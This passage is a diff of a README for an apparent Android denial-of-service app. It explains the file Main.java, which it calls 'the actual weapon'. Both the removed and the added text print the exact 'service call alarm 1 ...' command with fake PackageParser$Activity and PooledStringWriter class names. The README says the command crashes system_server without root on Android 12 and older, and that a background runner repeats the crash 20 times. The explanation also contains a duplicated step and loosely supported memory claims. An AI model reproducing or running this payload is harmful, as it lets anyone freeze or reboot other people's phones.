@@ -54,91 +54,58 @@ So in total:
 That’s it. The whole attack starts with this tiny button!
 
 
-### `Main.java` 
+### Super Simple Explanation of the Exploit Inside `Main.java`
 
-This is the **real brain** of the exploit. It contains the exact payload that crashes `system_server`.
+This file is the **actual weapon**.  
+Everything else (button, background runner) just runs one line from this file.
 
-```java
-public static class AlarmConfig {
-```
-A small helper class that holds all the numbers and strings we need to send.
+Here’s exactly what the exploit does, step by step, in plain English:
 
 ```java
-public int callingPackage = -1;
-public int type = 0;
-public long triggerAtTime = 0;
-// ... many more zeros and -1 ...
-public int alarmClock = 1;                    // ← super important: tells Android we have AlarmClockInfo
-public String parcelableClass = "android.content.pm.PackageParser$Activity";
-public int intentCount = 1;
-public String pooledStringClass = "android.os.PooledStringWriter";
-public int padding = 0;
+Main.crashSystemServer();
 ```
-These are the exact values that make the crash happen.  
-Changing most of them breaks the exploit.
+→ This single line kills the most important process on the entire phone.
 
-```java
-public static boolean setAlarm(AlarmConfig config) {
-```
-This function builds and runs the real command.
+#### How it kills it (what the code really sends):
 
-```java
-String[] command = {
-    "service", "call", "alarm", "1",          // talk to AlarmManager, transaction 1
-    "i32", "-1",                              // fake calling package
-    // ... all the normal alarm fields (mostly 0 and -1) ...
-    "i32", "1",                               // ← AlarmClockInfo is present
-    "s16", "android.content.pm.PackageParser$Activity",  // ← lie: this is not an Intent!
-    "i32", "-1", "i32", "-1",                 // fake fields
-    "i32", "1",                               // one fake intent
-    "s16", "android.os.PooledStringWriter",  // ← this class will kill the system
-    "i32", "0"                                // padding
-};
+The code runs this hidden command:
 ```
-This long list becomes exactly the same as typing this in a terminal:
-```
-service call alarm 1 i32 -1 ... s16 "android.content.pm.PackageParser\$Activity" ...
+service call alarm 1 i32 -1 i32 0 i64 0 ... i32 1 s16 "android.content.pm.PackageParser$Activity" i32 -1 i32 -1 i32 1 s16 "android.os.PooledStringWriter" i32 0
 ```
 
-```java
-ProcessBuilder pb = new ProcessBuilder(command);
-Process process = pb.start();
-```
-Runs the command inside Android (no need for ADB).
+Translated to English, it says:
 
-```java
-int exitCode = process.waitFor();
-```
-Waits for the command to finish.  
-On crash it usually returns a weird number or just hangs.
+> “Hey AlarmManager, please set an alarm for me.  
+> By the way, here’s a little extra info object…  
+> …and that object is actually a `PackageParser$Activity` (total lie).  
+> And inside that, there’s one more object: `PooledStringWriter`.  
+> Go ahead and create it for me.”
 
-```java
-public static void crashSystemServer() {
-    AlarmConfig config = new AlarmConfig();
-    setAlarm(config);        // ← one call = one system_server crash
-}
-```
-The only public function you call from the button or background runner.  
-One line → `system_server` dies.
+#### What Android does with that lie:
 
-```java
-public static void main(String[] args) {
-    crashSystemServer();     // you can also run the app as a Java program to test
-}
-```
+1. Android believes us and starts building a `PackageParser$Activity`.
+2. While building it, Android runs some automatic code.
+3. That code sees our second lie (`PooledStringWriter`) and says:
+   > “Okay, let me create a PooledStringWriter right now.”
+4. The `PooledStringWriter` class, as soon as it’s born, does this:
+   ```java
+   parcel.writeInt(0);   // ← tries to write into the message we just sent
+   ```
+5. But that message is stored in **read-only memory** (protected by the kernel).
+6. Trying to write there = illegal = instant crash.
+6. The process that tried to write = `system_server` → dies immediately.
 
-### Summary – What `Main.java` Actually Does
+#### Result
+- `system_server` crashes with `SIGSEGV` in `libbinder.so`
+- Phone freezes, reboots, or gets stuck
+- Background runner wakes up and does it again 20 times
 
-| Part                         | What it really means                                  |
-|------------------------------|--------------------------------------------------------|
-| `AlarmConfig`                | Stores the exact magic numbers and fake class names   |
-| `setAlarm()`                 | Builds and runs the `service call alarm 1 …` command   |
-| `crashSystemServer()`        | One-line function that kills `system_server`          |
+#### Summary in one sentence:
+We send a fake alarm that tricks Android into running a piece of code that illegally writes to protected memory → the whole system process explodes.
 
-That’s it.  
-Everything else (button, background runner) just calls `Main.crashSystemServer()` — this file is the actual weapon.
-
-
+That’s the entire exploit.  
+No root. No permissions. Just one perfectly crafted `service call`.  
+Works on Android 12 and older. Fixed forever in Android 13+.
 
 ### `RebootBackgroundRunner.java` 
 
